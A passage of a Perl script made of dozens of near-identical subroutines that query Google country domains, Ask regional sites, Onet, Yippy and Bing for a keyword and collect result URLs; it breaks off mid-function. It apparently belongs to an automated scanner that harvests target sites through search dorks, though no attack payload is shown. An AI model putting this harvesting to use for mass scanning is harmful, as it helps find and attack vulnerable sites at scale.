    for (my $i=1; $i<=50; $i+=1) {

        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&o=0&l=dir&qid=EE90DE6E8F5370F363A63EC61228D4FE&page=".$i."&jss=1&dm=all");

        my $res = search_engine_query($search);

                if ($res !~ /Successiva/) {$i=50;}

        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=\"/g) {

            if ($1 !~ /ask\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub googleCA() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ca/search?q=".uri_escape($key)."&hl=&cr=countryCA&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCA/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleDE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.de/search?q=".uri_escape($key)."&hl=&cr=countryDE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleDE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleUK() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.uk/search?q=".uri_escape($key)."&hl=&cr=countryUK&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleUK/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleFR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.fr/search?q=".uri_escape($key)."&hl=&cr=countryFR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleFR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleES() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.es/search?q=".uri_escape($key)."&hl=&cr=countryES&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleES/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleIT() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.it/search?q=".uri_escape($key)."&hl=&cr=countryIT&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIT/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(1);

sub googleNL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.nl/search?q=".uri_escape($key)."&hl=&cr=countryNL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleNL/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleBE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.be/search?q=".uri_escape($key)."&hl=&cr=countryBE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleBE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCH() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ch/search?q=".uri_escape($key)."&hl=&cr=countryCH&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCH/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(1);

sub googleSE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.se/search?q=".uri_escape($key)."&hl=&cr=countrySE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleSE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleDK() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.dk/search?q=".uri_escape($key)."&hl=&cr=countryDK&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleDK/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleNO() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.no/search?q=".uri_escape($key)."&hl=&cr=countryNO&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleNO/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(1);

sub googleNZ() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.nz/search?q=".uri_escape($key)."&hl=&cr=countryNZ&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleNZ/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleIE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ie/search?q=".uri_escape($key)."&hl=&cr=countryIE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleBR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.br/search?q=".uri_escape($key)."&hl=&cr=countryBR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(2);

sub googleAR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.ar/search?q=".uri_escape($key)."&hl=&cr=countryAR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleAR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCO() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.co/search?q=".uri_escape($key)."&hl=&cr=countryCO&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCO/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCU() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.cu/search?q=".uri_escape($key)."&hl=&cr=countryCU&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCU/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(2);

sub googleCL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.cl/search?q=".uri_escape($key)."&hl=&cr=countryCL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCL/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleMX() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.mx/search?q=".uri_escape($key)."&hl=&cr=countryMX&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleMX/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleAU() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.au/search?q=".uri_escape($key)."&hl=&cr=countryAU&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleAU/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(2);

sub googleRU() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.ru/search?q=".uri_escape($key)."&hl=&cr=countryRU&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleRU/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleAT() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.at/search?q=".uri_escape($key)."&hl=&cr=countryAT&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleAT/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googlePL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.pl/search?q=".uri_escape($key)."&hl=&cr=countryPL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googlePL/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleIL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.il/search?q=".uri_escape($key)."&hl=&cr=countryIL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIL/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleTR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.tr/search?q=".uri_escape($key)."&hl=&cr=countryTR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleTR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleUA() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.ua/search?q=".uri_escape($key)."&hl=&cr=countryUA&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleUA/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleGR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.gr/search?q=".uri_escape($key)."&hl=&cr=countryGR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleGR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleJP() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.jp/search?q=".uri_escape($key)."&hl=&cr=countryJP&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleJP/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCN() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.cn/search?q=".uri_escape($key)."&hl=&cr=countryCN&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCN/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleMY() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.my/search?q=".uri_escape($key)."&hl=&cr=countryMY&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleMY/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleTH() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.th/search?q=".uri_escape($key)."&hl=&cr=countryTH&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleTH/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleIN() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.in/search?q=".uri_escape($key)."&hl=&cr=countryIN&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIN/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleKR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.kr/search?q=".uri_escape($key)."&hl=&cr=countryKR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleKR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleRO() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ro/search?q=".uri_escape($key)."&hl=&cr=countryRO&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleRO/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleTW() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.tw/search?q=".uri_escape($key)."&hl=&cr=countryTW&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleTW/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleZA() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.za/search?q=".uri_escape($key)."&hl=&cr=countryZA&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleZA/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googlePT() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.pt/search?q=".uri_escape($key)."&hl=&cr=countryPT&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googlePT/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub ask() {

        my @list;

        my $key = $_[0];

        for (my $i=1; $i<=1000; $i+=100) {

                my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");

                my $res = &search_engine_query($search);

                while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

                        if ($link !~ /ask\.com/){

                                my @grep = &links($link);

                                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub askCA() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://ca.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askCA\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askDE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://de.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askDE\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askIT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askIT\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askUK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askUK\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askFR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://fr.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askFR\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askES() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://es.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askES\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askRU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://ru.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askRU\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askNL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://nl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askNL\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askPL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://pl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askPL\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askAT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://at.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askAT\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askSE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://se.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askSE\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askDK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://dk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askDK\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askNO() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://no.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askNO\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askAU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://au.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askAU\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askBR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://br.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askBR\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askMX() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://mx.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askMX\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askJP() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://jp.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askJP\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub onet() {

        my @list;

        my $key = $_[0];

        my $b   = 0;

        for ($b=1; $b<=400; $b+=10) {

                my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));

                my $res = &search_engine_query($search);

                while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {

                        my $link = $1;

                        if ($link !~ /onet|webcache|query/){

                                my @grep = &links($link);

                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub clusty() {

    my @list;

        my $key = $_[0];

    my $b   = 0;

        for ($b=10; $b<=200; $b+=10) {

        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");

        my $res = &search_engine_query($search);

                if ($res !~ /next/) {$b=100;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($1 !~ /yippy\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bing() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=400; $i+=10) {

